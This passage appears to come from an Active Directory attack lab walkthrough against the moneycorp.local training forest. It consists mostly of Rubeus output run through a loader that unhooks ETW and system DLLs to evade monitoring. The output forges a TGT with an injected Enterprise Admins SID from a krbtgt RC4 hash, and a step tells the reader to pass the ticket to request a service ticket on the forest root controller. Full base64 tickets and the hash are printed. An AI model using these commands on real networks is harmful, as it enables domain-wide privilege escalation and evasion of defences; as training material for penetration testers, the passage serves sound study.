[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
[*] ServiceKey     : 71AEC776D7FCDF15E2C88AD385D3AE56
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 71AEC776D7FCDF15E2C88AD385D3AE56
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : DOLLARCORP.MONEYCORP.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 9/29/2025 2:02:36 PM
[*] StartTime      : 9/29/2025 2:02:36 PM
[*] EndTime        : 9/30/2025 12:02:36 AM
[*] RenewTill      : 10/6/2025 2:02:36 PM

[*] base64(ticket.kirbi):

      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
```

### Copy the base64 encoded ticket from above and use it in the following command

* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE...

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:71aec776d7fcdf15e2c88ad385d3ae56 /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap
[*] Action: Build TGS

[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(samaccountname=Administrator)'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'DC=dollarcorp,DC=moneycorp,DC=local' for '(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (5)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL
[X] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (67)
[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.
[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local
[*] Searching path 'CN=Configuration,DC=moneycorp,DC=local' for '(&(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))'
[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 544,512,520,513
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
[*] ServiceKey     : 71AEC776D7FCDF15E2C88AD385D3AE56
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 71AEC776D7FCDF15E2C88AD385D3AE56
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : DOLLARCORP.MONEYCORP.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 9/29/2025 2:02:36 PM
[*] StartTime      : 9/29/2025 2:02:36 PM
[*] EndTime        : 9/30/2025 12:02:36 AM
[*] RenewTill      : 10/6/2025 2:02:36 PM

[*] base64(ticket.kirbi):

      doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE/qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBKYwggSioAMCARehAwIBA6KCBJQEggSQzqGgrDiTC8OwtURS1rtlbgzOVqZbkdnzX/r5kbb2YePUbu57h8wFblirI1LqxlWeDl0ZOdb4ERVHHl6hBX6QtcRsBZNIVQjc+LYUMw/eI819bUCKbk1AGAq8YwkNEv/oHdAqgeHnLwDbQHj4Cbk1J1b+i9DN4WvEbTLydZpf7jBCtgROm8nhu8CyMiwvWHh4VZpinwQs9A9AXAxI1SISBQVe86AhGD6GPCYbK6w89Up9XSe/nsVE6W/9gC2+682lBjOOF5AYFKZCqf8TNzjH9TqIq7D08aWmXb1GWVhdngw70NFvBj1M+eW/37Fm0xs2XgPxWfGMm5JC6afXUH0UyLUMYoCUFpMOL4xvDLN7hjzFCHM4CL0fX92ukWzQg6TwbOFa4afMFKodyxs0YlFO46/1h11uwT0P4z8IfQN2vx661gc5txOx8wRZGvCjxhsXT+TwOL8ry2Nz0qxY0x7jNdM/EArdYPWv5hCayf1DX+TAgGVA/UQS7d59Q7X1woTvnXgyRRCKoihoKG3vFRCO7IwW2fwJeDHTuIqzbtTBpnTz3PbnyJu3SDTNdYlpkLLxCNn1WnJj6U3aMTLn0pBtVVD0GOo5thc+nEsd8a5FW+Ya/MD5SLMnEsa9disCK9Mx50HYG6i/JVu+asxd1r7zsyy2fqXckbHs2QSa6Hi+3vxn3a5kp/8mrS9G3WLJc0OJ+dxTJTi8Vdcjc35mbfoIWTlpa1OQKEvIFxTyH5REbtccV0hFg3ifa22KNZpW5nbGA7hEQcfbTmTAr0ZN4D3Nj/YMco7JNdfto0lIpTOrwLzfyEbRdJUZiqKxhQj6plngSbF3+jPqi5tULC1bmQJW9QO0UnXxHrmHlGs+uDUqxhu9H+3jfu20HVr6jWKsKgTuNSqF2t2ZJiyXBDAFYsI6egJPdOFuvrVpIiiIr1778QS1xo9wYrJuQxkUP4oekXf7iUnvnyLIixAJlHqrFP0aW4khaPgXSDBcwo4A8df2CC6Ja6FWRgc4TfelPW96IpYENwWhDFNyn0dZ3ItzIiTNkcwemsbMzHvBpw1zDDNZ3btIUTsx5QJmZJGuStpKJV4dP1Mmsu3v3ZeRHMtuMELxJeHyfut6ZV7UqUKJib/5Bgtw3Pf5OSLFdcw/t/oMooeXrlo0t3urjfi1If5+e3xbkk2yoMbDMs9ur/6deKkuaFRoP+VpxiWLBFTbgntyqkMH8iMxmNIOVU2NG8GYisdM2fVduLcJ/DPQah7vXH4ugYcFy1AUbV2Rzg60tkWgRrMt9EoXLbdcMxfKL9+Gg3mvZopt3GEp3SwFttLba0DhN3VcxDFPZKZyjYaFzFhg2j2HXKHNbJL5jPkivCUZhjXo3i0QHgOGspcWhIu/Z4wgJ41ft/LVr1Ja0tBt9cRaQ2AXdW2NSPJEUT+wq5r2EE3L0MLJ/SFC/PlhAk6GHu54Fx/wjQ2Jwrte3YHIQxQ155fE7lPhhb4N0kVi0cA6g08aWXa4EzAtb5GCzx+0edGVwApHFCe5o9f7u414b/L6+W6IaK8s5LGKsFvlgWw7g7cOiaOCAR4wggEaoAMCAQCiggERBIIBDX2CAQkwggEFoIIBATCB/jCB+6AbMBmgAwIBF6ESBBDG6HAcAVDuMhVqghjMVdyEoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKAAAKQRGA8yMDI1MDkyOTIxMDIzNlqlERgPMjAyNTA5MjkyMTAyMzZaphEYDzIwMjUwOTMwMDcwMjM2WqcRGA8yMDI1MTAwNjIxMDIzNlqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0Z3QbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FM




C:\AD\Tools>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket: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
[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'http/mcorp-dc.MONEYCORP.LOCAL'
[*] Using domain controller: mcorp-dc.MONEYCORP.LOCAL (172.16.1.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

